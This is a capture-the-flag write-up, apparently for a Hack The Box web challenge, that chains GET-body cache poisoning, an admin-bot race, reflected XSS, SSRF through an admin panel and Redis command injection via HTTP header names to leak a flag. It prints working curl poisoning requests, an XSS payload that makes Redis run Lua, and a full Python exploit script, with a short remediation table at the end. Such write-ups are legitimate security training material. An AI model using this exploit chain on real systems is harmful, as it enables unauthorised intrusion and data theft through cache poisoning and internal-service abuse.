Challenge: Socrates
Category: Web Exploitation
Difficulty: Hard
Flag: HTB{REDACTED}
Stack: Python Tornado / Go reverse proxy / Redis / SQLite / Selenium

I did not solve Socrates in one clean line. It started as a normal source review, turned into a pile of small failed ideas, then finally clicked when the CDN cache behavior and the admin bot refresh lined up. The app looked like a quotes website, but the useful bugs were spread across the Go proxy, the Tornado app, the Selenium bot, and Redis.

The final exploit was a chain of four pieces: poison a cached search page with a GET body, race the admin bot until it refreshes into that poisoned page, use the resulting XSS to access the admin panel, then make the panel speak just enough Redis to write the flag into the CDN cache.

1. Overview

What the App Does

The application is split into three important parts:

Component Role
Go CDN service Public reverse proxy on port 1337, backed by Redis cache
Tornado web app Internal app on localhost:8888 with routes like /search, /panel, /api/report
Redis Stores both CDN cache entries and the challenge flag under key FLAG
Selenium admin bot Logs in as admin, visits a random search page, refreshes it, then exits

The Redis init script gives away the target:

redis-cli SET FLAG $(cat /flag.txt)

There is no direct Redis access from outside. So the problem becomes: can we make some trusted server-side component read Redis for us, or can we write a fake CDN cache entry whose body is the flag?

2. Reading the Architecture

The CDN Cache Key

The Go proxy hashes only the public URL string:

func hash(url string) string {
    h := sha256.New()
    h.Write([]byte(url))
    return hex.EncodeToString(h.Sum(nil))
}

key := hash(req.URL.String())

For a request like this:

GET /search?query=socrates

the cache key is:

sha256("/search?query=socrates")

The method and body are not part of the key. That is the first crack.

What Gets Cached

Only non-GET requests and direct /panel paths are dynamic. Everything else can be cached:

func dynamic(req *http.Request) bool {
    if req.Method != http.MethodGet {
        return true
    }

    dynamicPaths := []string{
        "/panel",
    }

    for _, path := range dynamicPaths {
        if strings.HasPrefix(req.URL.Path, path) {
            return true
        }
    }

    return false
}

The proxy forwards the original body to Tornado:

req, err := http.NewRequest(origReq.Method, originURL.String(), origReq.Body)

That line matters more than it first appears. A GET request can still carry a body, and the proxy does not strip it.

The Search Sink

The search handler takes query from Tornado's request arguments and renders it back into the template:

query = self.get_argument("query", default=None)
await insert_search(query)
self.render("search.html", search=query, verified_only=verified_only, results=results)

The template then prints the value directly in the page:

<input type="text" name="query" value="{{ search }}">
<h2>Results for "{{ search }}"</h2>

Autoescape is disabled in the app configuration, so this is reflected XSS.

3. False Starts

Before the working chain, I tried the obvious paths and each one died for a different reason. Those failures were useful because they narrowed the challenge down to a very specific shape.

Trying to Reach Internal Services Directly

The source showed Redis on 127.0.0.1:6379 and Tornado on 127.0.0.1:8888. The first thought was simple: maybe something was accidentally exposed. It was not. Direct TCP checks from outside timed out, so Redis and the origin app had to be reached through another component.

Trying Static File and Path Tricks

The Go proxy used url.JoinPath(), so I spent time testing encoded path traversal and normalization differences. Paths like this were interesting:

/foo/%2e%2e/panel

The CDN treated that as cacheable because the public path did not start with /panel, while the origin normalized it toward /panel. That proved the proxy and origin did not always agree about paths. Still, it did not give me the admin panel. Without the admin cookie, the origin only returned login redirects or 403 responses. Static traversal against config files also went nowhere.

Trying to Control the Report URL

The next idea was to submit my own URL to the report endpoint and make the bot visit a prepared XSS page. That failed because the report handler ignores user input completely:

url = f'http://127.0.0.1:1337/search?query={quote(rand_search(4))}'

No submitted URL, no Referer trick, no body parameter. The bot always visits a random search query generated by the server.

Trying the Admin Panel as a Normal User

The panel was clearly powerful because it fetched arbitrary URLs server-side. I registered a normal user and tried to reach it, but the route checks for admin:

if not self.is_admin():
    self.set_status(403)

So the panel could not be the start of the exploit. It had to be a post-XSS tool.

Poisoning a Page the Bot Would Never Visit

Once the GET-body cache poisoning bug was confirmed, I could poison any chosen search URL. That felt like the breakthrough for about five minutes. Then the catch became obvious: the bot does not visit my chosen search URL. It visits a random one. So a clean cache poisoning primitive was not enough by itself. I needed the bot's random query, and I needed it before the clean response was cached.

What the dead ends proved: I could not talk to Redis directly, I could not choose the report URL, and I could not use the panel before admin XSS. The only workable route was to poison the exact random search page the bot was already about to refresh.

4. Bug 1 - GET Body Cache Poisoning

The important detail is how Tornado handles arguments. get_argument("query") can read form body parameters, even when the HTTP method is GET. The Go CDN cache key ignores the body, but the origin app uses it.

This request poisons a safe-looking URL:

curl -i -X GET \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'query=<script>console.log(1337)</script>' \
  'http://target/search?query=bodycacheprobe'

The CDN sees the cache key as:

/search?query=bodycacheprobe

Tornado sees the body value:

<script>console.log(1337)</script>

The first request is a cache miss and stores the malicious render. A normal request to the same URL then hits the poisoned cache:

GET /search?query=bodycacheprobe
X-Cache: hit
Core primitive: I can choose a clean cache key in the URL and a malicious rendered value in the GET body. Anyone who later visits the clean URL gets my XSS from the cache.

5. Bug 2 - The Admin Bot Race

The Report Endpoint

The report endpoint does not let me choose a URL. It generates a random search query and sends the admin bot there:

url = f'http://127.0.0.1:1337/search?query={quote(rand_search(4))}'
threading.Thread(target=run_bot, args=(url,)).start()

The bot logs in as admin, visits that random URL, refreshes it once, then sleeps for a second:

self.driver.get('http://127.0.0.1:1337/login')
self.driver.find_element("name", "username").send_keys("admin")
self.driver.find_element("name", "password").send_keys(ADMIN_PASS)
self.driver.find_element("name", "submit").click()
self.driver.get(url)
self.driver.refresh()
sleep(1)

At first this looks bad. I can poison any URL, but the bot visits a URL I do not know until the report starts.

Leaking the Random Search

The search handler inserts the query into the searches table before it renders the page: 

await insert_search(query)

The public API exposes recent searches:

GET /api/prev_searches

So the race is:

  1. Trigger /api/report.
  2. Poll /api/prev_searches?cb=random until the bot query appears.
  3. Immediately poison /search?query=<bot query> with the GET body trick.
  4. If my poison stores first, the bot's refresh executes my cached XSS.

The cache buster on /api/prev_searches is important because the CDN would otherwise cache the API result too.

Making the Race Winnable

With the default data set, the origin response was too fast. My poison request kept arriving after the bot's clean response had already been cached.

The app lets any logged-in user submit quotes:

await insert_quote(quote, 0)

The search route scans quotes with LIKE, and when verified_only is absent, it searches all quotes, including unverified ones:

SELECT quote FROM quotes WHERE (LOWER(quote) LIKE ? OR ...)

I registered a throwaway user and added 3000 long unverified quotes. That slowed each random bot search enough to make the timing window practical.

6. Bug 3 - Admin Panel SSRF

Once XSS runs in the admin browser, the admin-only panel becomes reachable. The panel accepts a URL, fetches it server-side, and passes every other POST parameter as an outbound header:

url = self.get_argument("url", default=None)

headers = {}
for key in self.request.arguments:
    if key != "url":
        headers[key] = self.get_argument(key)

response = await http_client.fetch(url, headers=headers, request_timeout=3)

This gives admin JavaScript a server-side request primitive from Tornado. The target can be internal: 

http://127.0.0.1:6379/

That is Redis.

7. Bug 4 - Redis Through HTTP Headers

Redis supports inline commands, where a command is written as a plain text line:

SET key value

The panel lets me control header names. Tornado normalizes header names but does not reject spaces in them in this path. So a parameter name like this:

eval "<lua>" 0 x

becomes an outbound HTTP header line like this:

Eval "<lua>" 0 x: y

Redis commands are case-insensitive, so Eval works. The extra : y becomes unused argv data after the 0 key count.

I did not want to leave this as a guess, because this step depends on Tornado accepting a header name that normal HTTP clients should reject. I reproduced the panel fetch locally with a raw TCP listener in place of Redis. This is what the listener received:

GET / HTTP/1.1
Eval "redis.call('set','abc',cjson.encode({body=redis.call('get',string.char(70,76,65,71)),status_code=200,headers={foo={'bar'}}}));return" 0 x: y
Connection: close
Host: 127.0.0.1:19092
User-Agent: Tornado/6.1
Accept-Encoding: gzip

That capture proves the fragile part of the trick: the injected header name lands as its own line in the outbound request. Redis receives the HTTP request line first and treats it as a bad inline command, but that error does not stop the connection. It keeps parsing the next line, reaches Eval ..., and runs the Lua. I do not need Redis to return valid HTTP. I only need the command to execute before the connection dies.

This is version-sensitive. If the Tornado HTTP client backend rejects invalid header names, strips spaces, or emits headers in a different way, this exact payload will fail. On this challenge build, it worked.

The Lua script writes a fake CDN cache object to Redis. The CDN expects cached values as JSON:

{
  "body": "...",
  "status_code": 200,
  "headers": {"foo": ["bar"]}
}

So the Lua builds exactly that. I avoided writing the literal string FLAG because Tornado's header normalization can change case. Instead I used character codes:

redis.call('set','<cdn_cache_key>',cjson.encode({
  body=redis.call('get',string.char(70,76,65,71)),
  status_code=200,
  headers={foo={'bar'}}
}));return

string.char(70,76,65,71) is FLAG. The result is a cache entry where the HTTP body is the real flag.

8. Building the Exploit

Choosing the Leak URL

I picked a random path and calculated the exact CDN key:

leak_path = "/leak-random"
cache_key = sha256(leak_path.encode()).hexdigest()

The detail here is that the Go proxy uses req.URL.String() for an origin-form request. For a public request to /leak-random, the string being hashed is exactly /leak-random. There is no scheme, no host, and no surprise normalization for this plain path. If I used a query string, it would have to be included in the hash as well.

After Redis writes that key, requesting the path through the CDN should return the flag:

GET /leak-random

The Admin XSS Payload

The payload had to be short and fast. It builds a URLSearchParams body, adds the Redis command as a parameter name, and posts it to /panel:

<script>(()=>{
  s=String.fromCharCode(32);
  q=String.fromCharCode(34);
  h='eval'+s+q+`redis.call('set','CACHEKEY',cjson.encode({
    body=redis.call('get',string.char(70,76,65,71)),
    status_code=200,
    headers={foo={'bar'}}
  }));return`+s+`1`+q+s+`0`+s+`x`;
  p=new URLSearchParams;
  p.append('url','http://127.0.0.1:6379/');
  p.append(h,'y');
  fetch('/panel',{method:'POST',credentials:'include',body:p});
})()</script>

In the final script I removed whitespace from the payload. That mattered because the search handler splits the query on spaces and turns each word into a LIKE condition. A payload with lots of spaces makes my poison request slower.

The Race Loop

The exploit loop looked like this:

baseline = recent_searches()
trigger_report()

while time_left:
    searches = recent_searches(cache_buster=True)
    query = first_new_search(searches, baseline)
    if query:
        poison("/search?query=" + quote(query), body_payload)
        break

check("/leak-random")

I also sent the first poison request immediately on the same session, then sent a small parallel burst. The first one was the important one. The burst only helped if the first request was close but not quite there.

Full Exploit Script

import argparse
import concurrent.futures
import hashlib
import random
import re
import string
import sys
import time
from urllib.parse import quote

import requests


DEFAULT_TARGET = "http://target"
try:
    sys.stdout.reconfigure(line_buffering=True)
except Exception:
    pass


def nonce(n=8):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


def cdn_key(path_and_query):
    return hashlib.sha256(path_and_query.encode()).hexdigest()


def make_payload(cache_key, leak_path):
    lua = (
        "redis.call('set','%s',"
        "cjson.encode({body=redis.call('get',string.char(70,76,65,71)),"
        "status_code=200,headers={foo={'bar'}}}));return"
    ) % cache_key

    js = (
        "<script>(()=>{"
        "s=String.fromCharCode(32);"
        "q=String.fromCharCode(34);"
        "h='eval'+s+q+`%s`+s+`1`+q+s+`0`+s+`x`;"
        "p=new(URLSearchParams);"
        "p.append('url','http://127.0.0.1:6379/');"
        "p.append(h,'y');"
        "fetch('/panel',{method:'POST',credentials:'include',body:p}).catch(()=>{});"
        "fetch('%s').catch(()=>{})"
        "})()</script>"
    ) % (lua, leak_path)
    if any(c.isspace() for c in js):
        raise ValueError("payload unexpectedly contains whitespace")
    if '"' in js:
        raise ValueError("payload unexpectedly contains double quotes")
    return js


def recent_searches(session, target):
    url = f"{target}/api/prev_searches?cb={time.time_ns()}-{nonce(4)}"
    r = session.get(url, timeout=2)
    r.raise_for_status()
    return r.json().get("searches", [])


def poison_one(target, query, payload):
    return poison_one_session(requests, target, query, payload)


def poison_one_session(session, target, query, payload):
    url = f"{target}/search?query={quote(query)}"
    r = session.get(
        url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data={"query": payload},
        timeout=8,
    )
    return r.headers.get("X-Cache", "?"), len(r.text), payload in r.text


def trigger_report(session, target):
    r = session.post(f"{target}/api/report", timeout=3)
    r.raise_for_status()
    return r.text


def register_and_slow(target, count):
    if count <= 0:
        return

    s = requests.Session()
    user = f"user{nonce(10)}"
    password = nonce(14)
    s.post(
        f"{target}/register",
        data={"username": user, "password": password},
        allow_redirects=False,
        timeout=5,
    )
    login = s.post(
        f"{target}/login",
        data={"username": user, "password": password},
        allow_redirects=False,
        timeout=5,
    )
    if "username" not in s.cookies.get_dict():
        print(f"[!] login cookie not observed; status={login.status_code}")

    base = ("wisdom " * 260).strip()
    print(f"[*] adding {count} long unverified quotes as {user}")
    ok = 0
    for i in range(count):
        quote_text = f"{base} slowrow {user} {i}"
        r = s.post(f"{target}/api/quotes", data={"quote": quote_text}, timeout=5)
        if r.status_code == 200:
            ok += 1
        if (i + 1) % 50 == 0:
            print(f"    added {ok}/{i + 1}")
    print(f"[*] quote slowdown rows accepted: {ok}/{count}")


def check_leak(session, target, leak_path):
    r = session.get(f"{target}{leak_path}", timeout=5)
    text = r.text.strip()
    m = re.search(r"HTB\{[^}\n]+\}", text)
    return r.headers.get("X-Cache", "?"), r.status_code, text[:300], m.group(0) if m else None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default=DEFAULT_TARGET)
    ap.add_argument("--attempts", type=int, default=40)
    ap.add_argument("--spray", type=int, default=4)
    ap.add_argument("--slow-quotes", type=int, default=250)
    ap.add_argument("--poll-seconds", type=float, default=8.0)
    ap.add_argument("--poll-delay", type=float, default=0.015)
    args = ap.parse_args()

    target = args.target.rstrip("/")
    leak_path = f"/leak-{nonce(12)}"
    key = cdn_key(leak_path)
    payload = make_payload(key, leak_path)
    print(f"[*] target: {target}")
    print(f"[*] leak path: {leak_path}")
    print(f"[*] cache key: {key}")
    print(f"[*] payload length: {len(payload)} bytes")

    register_and_slow(target, args.slow_quotes)

    s = requests.Session()
    poisoned = set()
    baseline = set(recent_searches(s, target))
    print(f"[*] baseline recent searches: {len(baseline)}")

    for attempt in range(1, args.attempts + 1):
        print(f"[*] attempt {attempt}/{args.attempts}: triggering report")
        try:
            trigger_report(s, target)
        except Exception as e:
            print(f"[!] report failed: {e}")
            continue

        found = None
        deadline = time.time() + args.poll_seconds
        while time.time() < deadline:
            try:
                searches = recent_searches(s, target)
            except Exception:
                time.sleep(args.poll_delay)
                continue

            for q in searches:
                if q not in baseline and q not in poisoned:
                    found = q
                    break
            if found:
                break
            time.sleep(args.poll_delay)

        if not found:
            print("    no new bot query observed")
            baseline.update(searches if "searches" in locals() else [])
            continue

        poisoned.add(found)
        baseline.add(found)
        print(f"    new bot query: {found!r}")
        print(f"    poisoning /search?query={quote(found)} immediately, then {args.spray} parallel requests")

        interesting = False
        try:
            xcache, size, reflected = poison_one_session(s, target, found, payload)
            interesting = interesting or xcache != "hit" or reflected
            print(f"      urgent poison: X-Cache={xcache} bytes={size} reflected={reflected}")
        except Exception as e:
            print(f"      urgent poison error: {e}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.spray) as pool:
            futures = [pool.submit(poison_one, target, found, payload) for _ in range(args.spray)]
            for fut in concurrent.futures.as_completed(futures):
                try:
                    xcache, size, reflected = fut.result()
                    interesting = interesting or xcache != "hit" or reflected
                    print(f"      poison result: X-Cache={xcache} bytes={size} reflected={reflected}")
                except Exception as e:
                    print(f"      poison error: {e}")

        if not interesting:
            print("    all poison requests hit an existing safe cache entry; skipping leak wait")
            continue

        for wait in (0.25, 0.75, 1.5, 3.0):
            time.sleep(wait)
            try:
                xcache, status, snippet, flag = check_leak(s, target, leak_path)
            except Exception as e:
                print(f"    leak check error: {e}")
                continue
            print(f"    leak check: status={status} X-Cache={xcache} body={snippet!r}")
            if flag:
                print(f"[+] FLAG: {flag}")
                return

    print("[!] attempts exhausted without flag")


if __name__ == "__main__":
    main()

9. Running It Live

The first version of the exploit was too optimistic. I registered a user, added 250 long quotes, and started triggering reports. The script learned the random bot query from /api/prev_searches, but every poison request came back like this: 

X-Cache: hit
reflected=False

That was a very useful failure. It meant my logic was fine, but my timing was not. The bot's clean response was already in Redis by the time my poisoning request arrived. Once the clean page was cached, the CDN ignored my GET body and served the safe response. With 250 slowdown rows, I saw zero poison wins in the first nine report triggers.

I checked fresh search latency and it was only around a fraction of a second. Not enough. So I pushed the slowdown harder: 3000 long unverified quotes. The app accepted them, and that made each bot search expensive enough to race.

The second run finally produced the signal I wanted:

urgent poison: X-Cache=miss reflected=True

X-Cache: miss meant my poison request reached the origin before a cache entry existed. reflected=True meant the malicious body was rendered into the page and stored. That did not guarantee the flag immediately. The bot still had to refresh after the poisoned entry existed, and the admin JavaScript still had to hit the panel and Redis cleanly.

With 3000 slowdown rows, the odds changed a lot. Attempt 1 still lost, attempt 2 won the poison race but did not return the flag, and attempt 9 won again. That time the bot refreshed into the poisoned cached page, the panel hit Redis, and the leak path changed from a cached 404 into a cached flag response:

status=200 X-Cache=hit body='HTB{REDACTED}'

10. Why the Final Chain Worked

The working exploit is really about making different components disagree about the same request.

The CDN and Tornado Disagreed About GET Bodies

The CDN decided cache identity from the URL only. Tornado decided the rendered search value from the request arguments, which included the form body. So the URL could stay clean while the body carried JavaScript. The cache stored the origin's rendered response under the clean URL.

The Bot Gave Me a Second Chance

If the bot only visited the random URL once, this would be much harder. The refresh is what made the race useful. The first bot visit started the origin search and inserted the query into recent searches. While that slow search was still rendering, I learned the query and poisoned the same CDN key. When the bot refreshed, it requested the same URL again and could receive the poisoned cached page.

The Panel Turned XSS Into Server-Side Reach

Browser JavaScript cannot connect to 127.0.0.1:6379 on the server. But admin JavaScript can send a same-origin POST to /panel, and the panel can fetch internal URLs from the server side. That is the bridge from client-side XSS to internal Redis.

The Header Name Became a Redis Command

The strangest part was also the most useful one. The panel copied POST parameter names into outbound HTTP header names. Tornado emitted the custom header before normal headers like Host. Redis first saw the HTTP request line and errored on it, then kept parsing and read my custom header line as an inline command:

Eval "<lua>" 0 x: y

Redis executed the Lua before the HTTP request fully fell apart. I did not need a valid HTTP response from Redis. I only needed the command to run.

The CDN Became the Exfiltration Channel

The Lua did not send the flag to the internet. It wrote a Redis key the CDN already trusted. The value was a valid cached response object, with the flag as the body. After that, a normal external request to the chosen leak path made the CDN read Redis and serve the flag back.

12. Remediation

Issue Fix
GET body affects cached response Reject bodies on GET requests, or include body hash and selected headers in the cache key.
Reflected XSS in search Enable template escaping and never render user input as raw HTML.
Recent searches leak bot state Do not expose global recent searches, or separate admin bot activity from public telemetry.
Expensive unverified quote searches Search only approved content by default and add query limits, indexes, or full-text search.
Admin panel SSRF Block loopback and internal IP ranges. Use a strict allowlist for fetch targets.
Header name injection into internal fetches Validate outbound header names with the HTTP token grammar. Reject spaces and control characters.
